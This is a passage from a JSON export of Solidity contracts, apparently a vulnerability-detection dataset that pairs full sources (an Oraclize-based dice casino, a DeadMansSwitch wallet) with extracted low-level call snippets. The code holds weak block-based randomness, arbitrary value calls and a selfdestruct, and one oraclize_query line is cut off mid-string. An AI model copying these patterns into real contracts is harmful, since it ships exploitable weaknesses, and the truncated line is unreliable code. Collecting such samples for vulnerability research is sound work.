elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0) || (_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping (bytes32 => bytes32) oraclize_randomDS_args;\n mapping (bytes32 => bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4 + (uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset + (uint(dersig[offset - 1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset + 1]) + 2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3 + 1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1 + 65 + 32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset - 65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1 + 65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1 + 65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3 + 65 + 1]) + 2);\n copyBytes(proof, 3 + 65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\") || (_proof[1] != \"P\") || (_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i = 0; i < prefix.length; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3 + 65 + (uint(proof[3 + 65 + 1]) + 2) + 32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength + (32 + 8 + 1 + 32) + 1]) + 2);\n copyBytes(proof, ledgerProofLength + (32 + 8 + 1 + 32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8 + 1 + 32);\n copyBytes(proof, ledgerProofLength + 32, 8 + 1 + 32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength + 32 + (8 + 1 + 32) + sig1.length + 65;\n copyBytes(proof, sig2offset - 64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)) {\n delete oraclize_randomDS_args[queryId];\n }\n else return false;\n bytes memory tosign1 = new bytes(32 + 8 + 1 + 32);\n copyBytes(proof, ledgerProofLength, 32 + 8 + 1 + 32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false) {\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v\n := byte(0, mload(add(sig, 96)))\n }\nif (v < 27)\nv += 27;\nif (v != 27 && v != 28)\nreturn (false, 0);\nreturn safer_ecrecover(hash, v, r, s);\n}\n}\nlibrary strings {\nstruct slice {\nuint _len;\nuint _ptr;\n}\nfunction memcpy(uint dest, uint src, uint len) private {\nfor (; len >= 32; len -= 32) {\nassembly {\nmstore(dest, mload(src))\n}\ndest += 32;\nsrc += 32;\n}\nuint mask = 256 ** (32 - len) - 1;\nassembly {\nlet srcpart := and(mload(src), not(mask))\nlet destpart := and(mload(dest), mask)\nmstore(dest, or(destpart, srcpart))\n}\n}\nfunction toSlice(string self) internal returns (slice) {\nuint ptr;\nassembly {\nptr := add(self, 0x20)\n}\nreturn slice(bytes(self).length, ptr);\n}\nfunction len(bytes32 self) internal returns (uint) {\nuint ret;\nif (self == 0)\nreturn 0;\nif (self & 0xffffffffffffffffffffffffffffffff == 0) {\nret += 16;\nself = bytes32(uint(self) / 0x100000000000000000000000000000000);\n}\nif (self & 0xffffffffffffffff == 0) {\nret += 8;\nself = bytes32(uint(self) / 0x10000000000000000);\n}\nif (self & 0xffffffff == 0) {\nret += 4;\nself = bytes32(uint(self) / 0x100000000);\n}\nif (self & 0xffff == 0) {\nret += 2;\nself = bytes32(uint(self) / 0x10000);\n}\nif (self & 0xff == 0) {\nret += 1;\n}\nreturn 32 - ret;\n}\nfunction toSliceB32(bytes32 self) internal returns (slice ret) {\nassembly {\nlet ptr := mload(0x40)\nmstore(0x40, add(ptr, 0x20))\nmstore(ptr, self)\nmstore(add(ret, 0x20), ptr)\n}\nret._len = len(self);\n}\nfunction copy(slice self) internal returns (slice) {\nreturn slice(self._len, self._ptr);\n}\nfunction toString(slice self) internal returns (string) {\nvar ret = new string(self._len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nmemcpy(retptr, self._ptr, self._len);\nreturn ret;\n}\nfunction len(slice self) internal returns (uint) {\nvar ptr = self._ptr - 31;\nvar end = ptr + self._len;\nfor (uint len = 0; ptr < end; len++) {\nuint8 b;\nassembly {b := and(mload(ptr), 0xFF)}\nif (b < 0x80) {\nptr += 1;\n} else if (b < 0xE0) {\nptr += 2;\n} else if (b < 0xF0) {\nptr += 3;\n} else if (b < 0xF8) {\nptr += 4;\n} else if (b < 0xFC) {\nptr += 5;\n} else {\nptr += 6;\n}\n}\nreturn len;\n}\nfunction empty(slice self) internal returns (bool) {\nreturn self._len == 0;\n}\nfunction compare(slice self, slice other) internal returns (int) {\nuint shortest = self._len;\nif (other._len < self._len)\nshortest = other._len;\nvar selfptr = self._ptr;\nvar otherptr = other._ptr;\nfor (uint idx = 0; idx < shortest; idx += 32) {\nuint a;\nuint b;\nassembly {\na := mload(selfptr)\nb := mload(otherptr)\n}\nif (a != b) {\nuint mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\nvar diff = (a & mask) - (b & mask);\nif (diff != 0)\nreturn int(diff);\n}\nselfptr += 32;\notherptr += 32;\n}\nreturn int(self._len) - int(other._len);\n}\nfunction equals(slice self, slice other) internal returns (bool) {\nreturn compare(self, other) == 0;\n}\nfunction nextRune(slice self, slice rune) internal returns (slice) {\nrune._ptr = self._ptr;\nif (self._len == 0) {\nrune._len = 0;\nreturn rune;\n}\nuint len;\nuint b;\nassembly {b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)}\nif (b < 0x80) {\nlen = 1;\n} else if (b < 0xE0) {\nlen = 2;\n} else if (b < 0xF0) {\nlen = 3;\n} else {\nlen = 4;\n}\nif (len > self._len) {\nrune._len = self._len;\nself._ptr += self._len;\nself._len = 0;\nreturn rune;\n}\nself._ptr += len;\nself._len -= len;\nrune._len = len;\nreturn rune;\n}\nfunction nextRune(slice self) internal returns (slice ret) {\nnextRune(self, ret);\n}\nfunction ord(slice self) internal returns (uint ret) {\nif (self._len == 0) {\nreturn 0;\n}\nuint word;\nuint len;\nuint divisor = 2 ** 248;\nassembly {word := mload(mload(add(self, 32)))}\nvar b = word / divisor;\nif (b < 0x80) {\nret = b;\nlen = 1;\n} else if (b < 0xE0) {\nret = b & 0x1F;\nlen = 2;\n} else if (b < 0xF0) {\nret = b & 0x0F;\nlen = 3;\n} else {\nret = b & 0x07;\nlen = 4;\n}\nif (len > self._len) {\nreturn 0;\n}\nfor (uint i = 1; i < len; i++) {\ndivisor = divisor / 256;\nb = (word / divisor) & 0xFF;\nif (b & 0xC0 != 0x80) {\nreturn 0;\n}\nret = (ret * 64) | (b & 0x3F);\n}\nreturn ret;\n}\nfunction keccak(slice self) internal returns (bytes32 ret) {\nassembly {\nret := sha3(mload(add(self, 32)), mload(self))\n}\n}\nfunction startsWith(slice self, slice needle) internal returns (bool) {\nif (self._len < needle._len) {\nreturn false;\n}\nif (self._ptr == needle._ptr) {\nreturn true;\n}\nbool equal;\nassembly {\nlet len := mload(needle)\nlet selfptr := mload(add(self, 0x20))\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\nreturn equal;\n}\nfunction beyond(slice self, slice needle) internal returns (slice) {\nif (self._len < needle._len) {\nreturn self;\n}\nbool equal = true;\nif (self._ptr != needle._ptr) {\nassembly {\nlet len := mload(needle)\nlet selfptr := mload(add(self, 0x20))\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\n}\nif (equal) {\nself._len -= needle._len;\nself._ptr += needle._len;\n}\nreturn self;\n}\nfunction endsWith(slice self, slice needle) internal returns (bool) {\nif (self._len < needle._len) {\nreturn false;\n}\nvar selfptr = self._ptr + self._len - needle._len;\nif (selfptr == needle._ptr) {\nreturn true;\n}\nbool equal;\nassembly {\nlet len := mload(needle)\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\nreturn equal;\n}\nfunction until(slice self, slice needle) internal returns (slice) {\nif (self._len < needle._len) {\nreturn self;\n}\nvar selfptr = self._ptr + self._len - needle._len;\nbool equal = true;\nif (selfptr != needle._ptr) {\nassembly {\nlet len := mload(needle)\nlet needleptr := mload(add(needle, 0x20))\nequal := eq(sha3(selfptr, len), sha3(needleptr, len))\n}\n}\nif (equal) {\nself._len -= needle._len;\n}\nreturn self;\n}\nfunction findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\nuint ptr;\nuint idx;\nif (needlelen <= selflen) {\nif (needlelen <= 32) {\nassembly {\nlet mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\nlet needledata := and(mload(needleptr), mask)\nlet end := add(selfptr, sub(selflen, needlelen))\nptr := selfptr\nloop :\njumpi(exit, eq(and(mload(ptr), mask), needledata))\nptr := add(ptr, 1)\njumpi(loop, lt(sub(ptr, 1), end))\nptr := add(selfptr, selflen)\nexit:\n}\nreturn ptr;\n} else {\nbytes32 hash;\nassembly {hash := sha3(needleptr, needlelen)}\nptr = selfptr;\nfor (idx = 0; idx <= selflen - needlelen; idx++) {\nbytes32 testHash;\nassembly {testHash := sha3(ptr, needlelen)}\nif (hash == testHash)\nreturn ptr;\nptr += 1;\n}\n}\n}\nreturn selfptr + selflen;\n}\nfunction rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\nuint ptr;\nif (needlelen <= selflen) {\nif (needlelen <= 32) {\nassembly {\nlet mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\nlet needledata := and(mload(needleptr), mask)\nptr := add(selfptr, sub(selflen, needlelen))\nloop :\njumpi(ret, eq(and(mload(ptr), mask), needledata))\nptr := sub(ptr, 1)\njumpi(loop, gt(add(ptr, 1), selfptr))\nptr := selfptr\njump(exit)\nret :\nptr := add(ptr, needlelen)\nexit :\n}\nreturn ptr;\n} else {\nbytes32 hash;\nassembly {hash := sha3(needleptr, needlelen)}\nptr = selfptr + (selflen - needlelen);\nwhile (ptr >= selfptr) {\nbytes32 testHash;\nassembly {testHash := sha3(ptr, needlelen)}\nif (hash == testHash)\nreturn ptr + needlelen;\nptr -= 1;\n}\n}\n}\nreturn selfptr;\n}\nfunction find(slice self, slice needle) internal returns (slice) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\nself._len -= ptr - self._ptr;\nself._ptr = ptr;\nreturn self;\n}\nfunction rfind(slice self, slice needle) internal returns (slice) {\nuint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\nself._len = ptr - self._ptr;\nreturn self;\n}\nfunction split(slice self, slice needle, slice token) internal returns (slice) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\ntoken._ptr = self._ptr;\ntoken._len = ptr - self._ptr;\nif (ptr == self._ptr + self._len) {\nself._len = 0;\n} else {\nself._len -= token._len + needle._len;\nself._ptr = ptr + needle._len;\n}\nreturn token;\n}\nfunction split(slice self, slice needle) internal returns (slice token) {\nsplit(self, needle, token);\n}\nfunction rsplit(slice self, slice needle, slice token) internal returns (slice) {\nuint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\ntoken._ptr = ptr;\ntoken._len = self._len - (ptr - self._ptr);\nif (ptr == self._ptr) {\nself._len = 0;\n} else {\nself._len -= token._len + needle._len;\n}\nreturn token;\n}\nfunction rsplit(slice self, slice needle) internal returns (slice token) {\nrsplit(self, needle, token);\n}\nfunction count(slice self, slice needle) internal returns (uint count) {\nuint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\nwhile (ptr <= self._ptr + self._len) {\ncount++;\nptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n}\n}\nfunction contains(slice self, slice needle) internal returns (bool) {\nreturn rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n}\nfunction concat(slice self, slice other) internal returns (string) {\nvar ret = new string(self._len + other._len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nmemcpy(retptr, self._ptr, self._len);\nmemcpy(retptr + self._len, other._ptr, other._len);\nreturn ret;\n}\nfunction join(slice self, slice[] parts) internal returns (string) {\nif (parts.length == 0)\nreturn \"\";\nuint len = self._len * (parts.length - 1);\nfor (uint i = 0; i < parts.length; i++)\nlen += parts[i]._len;\nvar ret = new string(len);\nuint retptr;\nassembly {retptr := add(ret, 32)}\nfor (i = 0; i < parts.length; i++) {\nmemcpy(retptr, parts[i]._ptr, parts[i]._len);\nretptr += parts[i]._len;\nif (i < parts.length - 1) {\nmemcpy(retptr, self._ptr, self._len);\nretptr += self._len;\n}\n}\nreturn ret;\n}\n}\ncontract DSSafeAddSub {\nfunction safeAdd(uint a, uint b) internal returns (uint) {\nrequire(a + b >= a);\nreturn a + b;\n}\nfunction safeSub(uint a, uint b) internal returns (uint) {\nrequire(b <= a);\nreturn a - b;\n}\n}\ncontract SmartContractCasino is usingOraclize, DSSafeAddSub {\nusing strings for *;\nmodifier betIsValid(uint _betSize, uint _playerNumber) {\nif (((((_betSize * (100- (safeSub(_playerNumber, 1)))) / (safeSub(_playerNumber, 1))+ _betSize)) * houseEdge / houseEdgeDivisor) -_betSize > maxProfit || _betSize < minBet || _playerNumber < minNumber || _playerNumber > maxNumber) require(false);\n_;\n}\nmodifier gameIsActive {\nrequire(gamePaused != true);\n_;\n}\nmodifier payoutsAreActive {\nrequire(payoutsPaused != true);\n_;\n}\nmodifier onlyOraclize {\nrequire(msg.sender == oraclize_cbAddress());\n_;\n}\nmodifier onlyOwner {\nrequire(msg.sender == owner);\n_;\n}\nmodifier onlyTreasury {\nrequire(msg.sender == treasury);\n_;\n}\nuint constant public maxProfitDivisor = 1000000;\nuint constant public houseEdgeDivisor = 1000;\nuint constant public maxNumber = 99;\nuint constant public minNumber = 2;\nbool public gamePaused;\nuint32 public gasForOraclize;\naddress public owner;\nbool public payoutsPaused;\naddress public treasury;\nuint public contractBalance;\nuint public houseEdge;\nuint public maxProfit;\nuint public maxProfitAsPercentOfHouse;\nuint public minBet;\nint public totalBets = 751;\nuint public maxPendingPayouts;\nuint public totalWeiWon = 67308420060000000000;\nuint public totalWeiWagered = 115849260000000000000;\nmapping (bytes32 => address) playerAddress;\nmapping (bytes32 => address) playerTempAddress;\nmapping (bytes32 => bytes32) playerBetId;\nmapping (bytes32 => uint) playerBetValue;\nmapping (bytes32 => uint) playerTempBetValue;\nmapping (bytes32 => uint) playerDieResult;\nmapping (bytes32 => uint) playerNumber;\nmapping (address => uint) playerPendingWithdrawals;\nmapping (bytes32 => uint) playerProfit;\nmapping (bytes32 => uint) playerTempReward;\nevent LogBet(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RewardValue, uint ProfitValue, uint BetValue, uint PlayerNumber);\nevent LogResult(uint indexed ResultSerialNumber, bytes32 indexed BetID, address indexed PlayerAddress, uint BetValue, uint PlayerNumber, uint DiceResult, uint Value, int Status, bytes Proof);\nevent LogRefund(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RefundValue);\nevent LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\nfunction SmartContractCasino() {\nowner = msg.sender;\ntreasury = msg.sender;\noraclize_setNetwork(networkID_auto);\noraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\nownerSetHouseEdge(990);\nownerSetMaxProfitAsPercentOfHouse(100000);\nownerSetMinBet(100000000000000000);\ngasForOraclize = 250000;\n}\nfunction playerRollDice(uint rollUnder) public\npayable\ngameIsActive\nbetIsValid(msg.value, rollUnder)\n{\ncontractBalance = safeSub(contractBalance, oraclize_getPrice(\"URL\", gasForOraclize));\ntotalBets += 1;\ntotalWeiWagered += msg.value;\nbytes32 rngId = oraclize_query(\"nested\", \"[URL] ['json(https:\nplayerBetId[rngId] = rngId;\nplayerNumber[rngId] = rollUnder;\nplayerBetValue[rngId] = msg.value;\nplayerAddress[rngId] = msg.sender;\nplayerProfit[rngId] = ((((msg.value * (100 - (safeSub(rollUnder, 1)))) / (safeSub(rollUnder,1)) + msg.value)) *houseEdge / houseEdgeDivisor) - msg.value;\nmaxPendingPayouts = safeAdd(maxPendingPayouts, playerProfit[rngId]);\nrequire(maxPendingPayouts < contractBalance);\nLogBet(playerBetId[rngId], playerAddress[rngId], safeAdd(playerBetValue[rngId], playerProfit[rngId]), playerProfit[rngId], playerBetValue[rngId], playerNumber[rngId]);\n}\nfunction __callback(bytes32 myid, string result, bytes proof) public\nonlyOraclize\npayoutsAreActive\n{\nrequire(playerAddress[myid] != 0x0);\nvar sl_result = result.toSlice();\nsl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice());\nuint serialNumberOfResult = parseInt(sl_result.split(', '.toSlice()).toString());\nplayerDieResult[myid] = parseInt(sl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice()).toString());\nplayerTempAddress[myid] = playerAddress[myid];\ndelete playerAddress[myid];\nplayerTempReward[myid] = playerProfit[myid];\nplayerProfit[myid] = 0;\nmaxPendingPayouts = safeSub(maxPendingPayouts, playerTempReward[myid]);\nplayerTempBetValue[myid] = playerBetValue[myid];\nplayerBetValue[myid] = 0;\nif (playerDieResult[myid]== 0 || bytes(result).length == 0 || bytes(proof).length == 0){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerTempBetValue[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 3, proof);\nif (!playerTempAddress[myid].send(playerTempBetValue[myid])){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerTempBetValue[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 4, proof);\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempBetValue[myid]);\n}\nreturn;\n}\nif (playerDieResult[myid] < playerNumber[myid]){\ncontractBalance = safeSub(contractBalance, playerTempReward[myid]);\ntotalWeiWon = safeAdd(totalWeiWon, playerTempReward[myid]);\nplayerTempReward[myid] = safeAdd(playerTempReward[myid], playerTempBetValue[myid]);\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerTempBetValue[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 1, proof);\nsetMaxProfit();\nif (!playerTempAddress[myid].send(playerTempReward[myid])){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerTempBetValue[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 2, proof);\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempReward[myid]);\n}\nreturn;\n}\nif (playerDieResult[myid] >= playerNumber[myid]){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerTempBetValue[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 0, proof);\ncontractBalance = safeAdd(contractBalance, (playerTempBetValue[myid] - 1));\nsetMaxProfit();\nif (!playerTempAddress[myid].send(1)){\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], 1);\n}\nreturn;\n}\n}\nfunction playerWithdrawPendingTransactions() public\npayoutsAreActive\nreturns (bool)\n{\nuint withdrawAmount = playerPendingWithdrawals[msg.sender];\nplayerPendingWithdrawals[msg.sender] = 0;\nif (msg.sender.call.value(withdrawAmount)()) {\nreturn true;\n} else {\nplayerPendingWithdrawals[msg.sender] = withdrawAmount;\nreturn false;\n}\n}\nfunction playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) {\nreturn playerPendingWithdrawals[addressToCheck];\n}\nfunction setMaxProfit() internal {\nmaxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n}\nfunction sendFunds()\npayable\nonlyTreasury\n{\ncontractBalance = safeAdd(contractBalance, msg.value);\nsetMaxProfit();\n}\nfunction ownerSetOraclizeSafeGas(uint32 newSafeGasToOraclize) public\nonlyOwner\n{\ngasForOraclize = newSafeGasToOraclize;\n}\nfunction ownerUpdateContractBalance(uint newContractBalanceInWei) public\nonlyOwner\n{\ncontractBalance = newContractBalanceInWei;\n}\nfunction ownerSetHouseEdge(uint newHouseEdge) public\nonlyOwner\n{\nhouseEdge = newHouseEdge;\n}\nfunction ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\nonlyOwner\n{\nrequire(newMaxProfitAsPercent <= 100000);\nmaxProfitAsPercentOfHouse = newMaxProfitAsPercent;\nsetMaxProfit();\n}\nfunction ownerSetMinBet(uint newMinimumBet) public\nonlyOwner\n{\nminBet = newMinimumBet;\n}\nfunction ownerTransferEther(address sendTo, uint amount) public\nonlyOwner\n{\ncontractBalance = safeSub(contractBalance, amount);\nsetMaxProfit();\nrequire(sendTo.send(amount));\nLogOwnerTransfer(sendTo, amount);\n}\nfunction ownerRefundPlayer(bytes32 originalPlayerBetId, address sendTo, uint originalPlayerProfit, uint originalPlayerBetValue) public\nonlyOwner\n{\nmaxPendingPayouts = safeSub(maxPendingPayouts, originalPlayerProfit);\nrequire(sendTo.send(originalPlayerBetValue));\nLogRefund(originalPlayerBetId, sendTo, originalPlayerBetValue);\n}\nfunction ownerPauseGame(bool newStatus) public\nonlyOwner\n{\ngamePaused = newStatus;\n}\nfunction ownerPausePayouts(bool newPayoutStatus) public\nonlyOwner\n{\npayoutsPaused = newPayoutStatus;\n}\nfunction ownerSetTreasury(address newTreasury) public\nonlyOwner\n{\ntreasury = newTreasury;\n}\nfunction ownerChangeOwner(address newOwner) public\nonlyOwner\n{\nowner = newOwner;\n}\nfunction ownerkill() public\nonlyOwner\n{\nsuicide(owner);\n}\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1615"
  },
  "filename": "37676.sol",
  "content": "pragma solidity ^0.4;\ncontract DeadMansSwitch {\n event ReclaimBegun();\n event Reclaimed();\n event Sent(address indexed to, uint value, bytes data);\n event Received(address indexed from, uint value, bytes data);\n event Reset();\n event OwnerChanged(address indexed _old, address indexed _new);\n event BackupChanged(address indexed _old, address indexed _new);\n event ReclaimPeriodChanged(uint _old, uint _new);\n function DeadMansSwitch(address _owner, address _backup, uint _reclaimPeriod) {\n owner = _owner;\n backup = _backup;\n reclaimPeriod = _reclaimPeriod;\n }\n function() payable { Received(msg.sender, msg.value, msg.data); }\n function beginReclaim() only_backup when_no_timeout {\n timeout = now + reclaimPeriod;\n ReclaimBegun();\n }\n function finalizeReclaim() only_backup when_timed_out {\n owner = backup;\n timeout = 0;\n Reclaimed();\n }\n function reset() only_owner_or_backup {\n timeout = 0;\n Reset();\n }\n function send(address _to, uint _value, bytes _data) only_owner {\n if (!_to.call.value(_value)(_data)) throw;\n Sent(_to, _value, _data);\n }\n function setOwner(address _owner) only_owner {\n OwnerChanged(owner, _owner);\n owner = _owner;\n }\n function setBackup(address _backup) only_owner {\n BackupChanged(backup, _backup);\n backup = _backup;\n }\n function setReclaimPeriod(uint _period) only_owner {\n ReclaimPeriodChanged(reclaimPeriod, _period);\n reclaimPeriod = _period;\n }\n function reclaimStarted() constant returns (bool) {\n return timeout != 0;\n }\n function canFinalize() constant returns (bool) {\n return timeout != 0 && now > timeout;\n }\n function timeLeft() constant only_when_timeout returns (uint) {\n return now > timeout ? 0 : timeout - now;\n }\n modifier only_owner { if (msg.sender != owner) throw; _; }\n modifier only_backup { if (msg.sender != backup) throw; _; }\n modifier only_owner_or_backup { if (msg.sender != backup && msg.sender != owner) throw; _; }\n modifier only_when_timeout { if (timeout == 0) throw; _; }\n modifier when_no_timeout { if (timeout == 0) _; }\n modifier when_timed_out { if (timeout != 0 && now > timeout) _; }\n address public owner;\n address public backup;\n uint public reclaimPeriod;\n uint public timeout;\n}",
  "extract_feature": [
    "function send(address _to, uint _value, bytes _data) only_owner {\nif (!_to.call.value(_value)(_data)) throw;\nSent(_to, _value, _data);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1616"
  },
  "filename": "37741.sol",
